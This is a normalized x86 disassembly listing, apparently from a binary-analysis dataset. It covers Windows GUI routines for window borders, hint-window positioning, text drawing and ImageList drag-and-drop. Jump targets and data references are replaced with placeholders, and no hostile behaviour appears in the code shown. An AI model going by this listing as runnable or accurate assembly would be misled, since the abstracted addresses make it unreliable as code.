mov dl [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x38 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403430
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403430
jmp r-xdata
sub_43e854
sub edx 0x1
jb r-xdata
cmp cl [ eax + 0x163 ]
je r-xdata
je r-xdata
retn
mov [ eax + 0x163 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_43850c
retn
cmp cl [ eax + 0x164 ]
je r-xdata
jmp r-xdata
mov [ eax + 0x164 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_43850c
sub_43e898
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x162 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x162 ] al
push 0x0
xor ecx ecx
mov edx 0xb03b
mov eax ebx
call sub_43850c
sub_43e8e8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add eax [ ebx + 0x168 ]
mov esi edi
test [ ebx + 0x162 ] 0x1
je r-xdata
add eax [ ebx + 0x168 ]
test [ ebx + 0x162 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x162 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x162 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_43e978
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x16c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41ca38
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call ReleaseDC
retn
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x163 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
call sub_42a64c
call sub_42a72c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call GetWindowLongA
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
call sub_42a64c
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_42ad44
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] ebx
test esi 0x200000
je r-xdata
add [ ebp - 0x24 ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x8
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
test esi 0x100000
je r-xdata
add [ ebp - 0x20 ] ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x162 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x165 ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x163 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
sub_43ec20
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
lea edx [ esp + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406850
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax esi
call sub_436e9c
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_43b42c
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_43850c
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_4396d0
sub_43ec8c
push ebx
push esi
mov esi edx
call sub_44e0b4
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
sub si 0x9
je r-xdata
push 0x0
mov dx 0x1
mov ax 0x2
call sub_4067ec
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_43850c
jmp r-xdata
sub si 0x9
je r-xdata
push 0x0
mov dx 0x2
mov ax 0x2
call sub_4067ec
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_43850c
add esi 0xffffffed
sub si 0x4
jae r-xdata
sub_43ecf0
push esi
mov esi eax
cmp [ edx + 0xc ] 0x1
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ edx + 0x8 ] 0x1
je r-xdata
mov eax esi
call sub_43b7f4
jmp r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_43ed28
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_43ed20
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43ed68
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_436458
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cb54
mov esi eax
mov [ ebx + 0x160 ] esi
mov eax esi
mov edx ebx
call sub_435f34
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_43edc4
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_403234
mov edx ebx
and dl 0xfc
mov eax esi
call sub_436530
test bl bl
jle r-xdata
xor eax eax
call sub_434528
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_43ee04
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41ce58
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41d23c
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ee83
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
xor edx edx
call sub_41d23c
retn
sub_43eeb0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43f7a4
mov edx 0x80ffff
mov eax esi
call sub_4374f8
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x208 ]
call sub_41d0dc
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_41cb20
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_43ef1c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_43a9cc
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_40bad0
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_43a964
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_43ef88
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43efe5
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call ReleaseDC
retn
sub_43efec
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_41c238
mov eax ebx
call sub_439678
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_437358
mov eax [ ebp - 0x14 ]
call sub_40442c
push eax
mov eax [ ebx + 0x208 ]
call sub_41d1bc
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f08c
lea eax [ ebp - 0x14 ]
call sub_403f6c
retn
sub_43f094
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x108
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_43f100
push ebp
mov ebp esp
push 0x0
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f192
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f90
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_437358
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x208 ]
call sub_41d01c
mov edx eax
add edx 0x6
mov eax esi
call sub_436b14
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_437358
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x208 ]
call sub_41d038
mov edx eax
add edx 0x4
mov eax esi
call sub_436b38
sub_43f198
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_437388
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4385b0
mov eax [ esi ]
call sub_4548ec
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_4548f8
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_4548ec
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_4548e0
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_4548f8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_4548d4
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_4548e0
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x214 ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_4548d4
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_43b274
push 0x4
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f378
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax ebx
call sub_40422c
cmp eax 0x64
jge r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_4423ec
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call [ rw-data ]
sub_43f380
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43f3a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_41240c
mov eax esi
call sub_439678
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_40442c
push eax
mov eax [ esi + 0x208 ]
call sub_41d1bc
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_43f404
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_41240c
call sub_42a64c
call sub_42a72c
test al al
jne r-xdata
call sub_42a64c
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_42a9b8
push esp
push 0x1
push 0xf
push 0x0
call sub_42a64c
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_42a79c
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_43f470
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_43bb7c
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
pop ebx
retn
sub_43f494
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43f4d4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
cmp [ ebx + 0x68 ] 0xffff
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
push 0x1
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
push 0xd
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
call ImageList_Create
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_454dc0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_421ee0
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_454dc0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_421ee0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
lea eax [ ebp - 0xc ]
push eax
push 0x0
call ImageList_GetDragImage
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call ImageList_Destroy
retn
sub_43f5a0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_444434
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_444570
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_43f600
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_444434
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax esi
call sub_43f4d4
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_43f660
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_43f5a0
push 0x0
call ShowCursor
sub_43f660
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_444434
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_43f6c4
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_43f494
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_43f6c4
push ebx
mov ebx eax
mov eax ebx
call sub_444434
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_43f6e8
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_444434
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_43f494
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43f75c
push ebx
push esi
mov esi eax
mov eax esi
call sub_444434
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_43f6c4
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_43f5e8
push 0xffffffff
call ShowCursor
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_43f7a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43986c
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cb54
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_435f34
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_43f800
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403234
mov edx ebx
and dl 0xfc
mov eax esi
call sub_439990
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_43f850
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41ce58
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_41d23c
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_435f4c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f8d2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_41d23c
retn
sub_43f900
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_43f994
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_43f91c
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
